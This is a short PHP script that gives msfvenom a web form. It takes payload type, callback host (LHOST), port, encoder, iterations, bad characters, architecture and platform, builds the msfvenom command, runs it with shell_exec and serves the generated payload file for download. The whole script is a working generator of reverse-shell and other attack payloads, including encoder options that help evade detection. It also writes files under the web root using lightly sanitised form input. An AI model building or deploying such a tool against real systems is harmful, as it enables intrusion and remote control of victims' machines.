<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Validate and sanitize inputs
    $payload_type = escapeshellarg($_POST['payload-type']);
    $lhost = escapeshellarg($_POST['lhost']);
    $lport = escapeshellarg($_POST['lport']);
    $output_format = escapeshellarg($_POST['output-format']);
    $encoder = escapeshellarg($_POST['encoder']);
    $iterations = (int)$_POST['iterations']; // Ensure integer
    $bad_chars = escapeshellarg($_POST['bad-chars']);
    $architecture = escapeshellarg($_POST['architecture']);
    $platform = escapeshellarg($_POST['platform']);

    // Validate LHOST and LPORT
    if (!filter_var(trim($_POST['lhost']), FILTER_VALIDATE_IP)) {
        die("Invalid LHOST IP address.");
    }
    if (!is_numeric($_POST['lport']) || $_POST['lport'] <= 0 || $_POST['lport'] > 65535) {
        die("Invalid LPORT number.");
    }

    // Define output file with absolute path
    $output_file = "/var/www/html/payload." . escapeshellcmd($_POST['output-format']);

    // Construct msfvenom command
    $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport ";
    if (!empty($_POST['encoder'])) {
        $command .= "-e $encoder ";
    }
    if ($iterations > 0) {
        $command .= "-i $iterations ";
    }
    if (!empty($_POST['bad-chars'])) {
        $command .= "-b $bad_chars ";
    }
    $command .= "-a $architecture --platform $platform -f $output_format -o $output_file";

    // Execute command
    $output = shell_exec($command);

    // Verify file creation
    if (!file_exists($output_file)) {
        die("Failed to generate the payload. Check server logs.");
    }

    // Provide file for download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($output_file) . '"');
    header('Content-Length: ' . filesize($output_file));
    readfile($output_file);

    // Cleanup: Delete file after download
    unlink($output_file);
    exit;
}
?>
